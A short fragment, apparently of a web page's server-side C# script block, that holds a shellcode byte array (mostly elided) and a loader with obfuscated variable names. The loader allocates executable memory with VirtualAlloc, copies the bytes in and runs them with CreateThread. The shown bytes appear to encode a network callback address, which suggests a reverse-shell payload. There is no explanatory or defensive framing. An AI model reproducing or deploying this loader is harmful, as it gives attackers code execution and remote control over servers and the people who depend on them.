...
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x10,0xcc,0x0a,0x09,0x00,0xa8,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,
...
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
        ...
        IntPtr jh776 = VirtualAlloc(IntPtr.Zero,(UIntPtr)rocgB0Dp.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(rocgB0Dp,0,jh776,rocgB0Dp.Length);
        IntPtr qKX2X = IntPtr.Zero;
        IntPtr rPDMD6 = CreateThread(IntPtr.Zero,UIntPtr.Zero,jh776,IntPtr.Zero,0,ref qKX2X);
    }
</script>
